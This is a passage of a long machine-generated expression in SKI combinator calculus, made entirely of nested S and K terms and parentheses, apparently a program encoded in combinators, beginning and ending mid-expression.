(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))((K)(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))(((S)(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K))))))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))))((((S)((K)(S)))(K))(((((S)((K)(S)))(K))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K))))))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)(((((S)(((((S)((K